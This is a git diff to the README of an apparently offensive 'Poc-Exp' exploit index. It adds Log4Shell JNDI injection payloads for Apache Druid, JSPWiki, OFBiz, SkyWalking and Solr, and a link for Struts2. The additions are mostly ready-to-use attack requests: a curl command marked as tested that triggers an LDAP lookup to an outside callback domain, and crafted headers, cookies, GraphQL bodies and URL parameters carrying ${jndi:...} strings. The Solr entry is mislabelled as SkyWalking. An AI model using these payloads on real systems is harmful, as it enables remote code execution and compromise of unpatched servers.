@@ -2,12 +2,16 @@
 
 应用如下
 - [Apache APISIX](https://github.com/pen4uin/Poc-Exp#apache-apisix)
+- [Apache Druid](https://github.com/pen4uin/Poc-Exp#apache-druid)
 - [Apache Flink](https://github.com/pen4uin/Poc-Exp/#apache-flink)
 - [Apache HTTP Server](https://github.com/pen4uin/Poc-Exp#apache-http-server)
 - [Apache JSPWiki](https://github.com/pen4uin/Poc-Exp#apache-jspwiki)
 - [Apache OFBiz](https://github.com/0wlsec/Poc-Exp/#apache--ofbiz)
 - [Apache ShenYu](https://github.com/pen4uin/Poc-Exp#apache-shenyu)
+- [Apache SkyWalking](https://github.com/pen4uin/Poc-Exp#apache-skyWalking)
+- [Apache Solr](https://github.com/pen4uin/Poc-Exp#apache-solr)
 - [Apache Storm](https://github.com/pen4uin/Poc-Exp#apache-storm)
+- [Apache Struts2](https://github.com/pen4uin/Poc-Exp#apache-struts2)
 - [Atlassian Confluence](https://github.com/pen4uin/Poc-Exp/#atlassian-confluence)
 - [Atlassian Crowd](https://github.com/pen4uin/Poc-Exp/#atlassian-crowd)
 - [Atlassian Jira](https://github.com/pen4uin/Poc-Exp/#atlassian-jira)
@@ -58,7 +62,16 @@
 ## Apache APISIX
 - 🎯 CVE-2021-45232 Apache APISIX Dashboard Pre-Auth RCE
   - 📌 [apisix_dashboard_rce](https://github.com/wuppp/apisix_dashboard_rce)
-
+## Apache Druid
+- 🎯 [Apache Druid RCE via Log4shell](https://github.com/pen4uin/JavaSec/blob/main/apache%20druid/vulnerability-research.md)
+    ```http
+    # tested
+    curl -vv -X DELETE "http://10.10.10.139:8081/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2fcpy1p.aliyundun.net%7d"
+    # haven't tested
+    http://0.0.0.0:8888/druid/coordinator/${jndi:ldap://0.0.0.0/123}
+    http://0.0.0.0:8888/druid/indexer/${jndi:ldap://0.0.0.0/123}
+    http://0.0.0.0:8888/druid/v2/${jndi:ldap://0.0.0.0/123}
+    ```
 ## Apache Flink
 - 🎯 CVE-2020-17518(Apache Flink 目录遍历/文件写入漏洞-Upload) `2021-01`
 - 🎯 CVE-2020-17519(Apache Flink 目录遍历/文件读取漏洞-jobmanager/logs)b`2021-01`
@@ -69,18 +82,45 @@
 
 ## Apache JSPWiki
 - 🎯 CVE-2021-44140 Apache JSPWiki Arbitrary file deletion on logout
-
+- 🎯 Apache JSPWiki RCE via Log4shell
+    ```http
+    http://0.0.0.0:8080/Edit.jsp?page=Main
+    X-Forwarded-For:${jndi:dns://0.0.0.0/123}
+    ```
 ## Apache OFBiz
 - 🎯 CVE-2020-9496 Apache Ofbiz 远程代码执行漏洞
-- 🎯 CVE-2021-26295 Apache OFBiz 远程代码执行漏洞 
+- 🎯 CVE-2021-26295 Apache OFBiz 远程代码执行漏洞
+- 🎯 Apache OFBiz RCE via Log4shell
+    ```http
+    # 1、
+    GET: https://0.0.0.0:8443/webtools/control/main
+    Cookie: OFBiz.Visitor=${jndi:ldap://0.0.0.0/123}
+    # 2、
+    POST: https://0.0.0.0:8443/webtools/control/setLocaleFromBrowser
+    Content-Type: text/html;charset=UTF-8${jndi:ldap://0.0.0.0/123}
+    ```
 
 ## Apache ShenYu
 - 🎯 CVE-2021-37580 Apache ShenYu 身份验证绕过漏洞
-
+## Apache SkyWalking
+- 🎯 Apache SkyWalking RCE via Log4shell 
+    ```http
+    POST: http://0.0.0.0:8080/graphql
+    data: {"query":"${jndi:dns://0.0.0.0/123}","variables":{"duration":{"start":"2021-12-22 1259","end":"2021-12-22 1314","step":"MINUTE"}}}
+    ```
+    
+## Apache Solr
+- 🎯 Apache SkyWalking RCE via Log4shell 
+    ```http
+    /solr/admin/cores?action=CREATE&name=$%7Bjndi:ldap://0.0.0.0/123%7D&wt=json
+    /solr/admin/info/system?_=${jndi:ldap://0.0.0.0/123}&wt=json
+    /solr/admin/cores?_=&action=&config=&dataDir=&instanceDir=${jndi:ldap://0.0.0.0/123}&name=
+    ```
 ## Apache Storm
 - 🎯 CVE-2021-38294 Apache Storm 反序列化漏洞
 - 🎯 CVE-2021-40865 Apache Storm 命令注入漏洞
-
+## Apache Struts2
+- 🎯 [Apache Struts2 RCE via Log4Shell](https://github.com/pen4uin/JavaSec/blob/main/struts2/vulnerability-research.md)
 ## Atlassian Confluence
 - 🎯 CVE-2019-3396 Atlassian Confluence 路径穿越漏洞
 - 🎯 CVE-2021-26084 Atlassian Confluence OGNL 注入漏洞-可回显)
@@ -385,4 +425,7 @@
 
 
 
+
+reference：
+- https://mp.weixin.qq.com/s/VGMxrw8HD2ZbQHpyL-V_nQ
 
